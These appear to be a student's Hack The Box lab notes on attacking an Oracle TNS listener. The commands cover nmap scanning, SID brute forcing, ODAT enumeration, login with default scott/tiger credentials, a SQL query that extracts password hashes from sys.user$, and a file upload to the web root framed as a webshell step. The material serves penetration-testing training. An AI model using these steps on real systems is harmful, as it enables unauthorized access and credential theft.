
`Orbixio@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open`

**SID Bruteforcing**
`Orbixio@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`

**Enumeration**
`Orbixio@htb[/htb]$ ./odat.py all -s 10.129.204.235`

**Interaction**
`Orbixio@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE`

If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below:

`Orbixio@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

| **Command**                             | **Detail**                                                               |
| --------------------------------------- | ------------------------------------------------------------------------ |
| `select table_name from all_tables;`    | Returns a list of all table names accessible to the current user.        |
| `select * from user_role_privs;`        | Displays the roles granted to the current user.                          |
| `select * from user_role_privs;`        | Displays the roles granted to the current user.                          |
| `select name, password from sys.user$;` | Retrieves the usernames and hashed passwords from the system user table. |


**Webshell**

```
Orbixio@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
Orbixio@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Test
Orbixio@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
```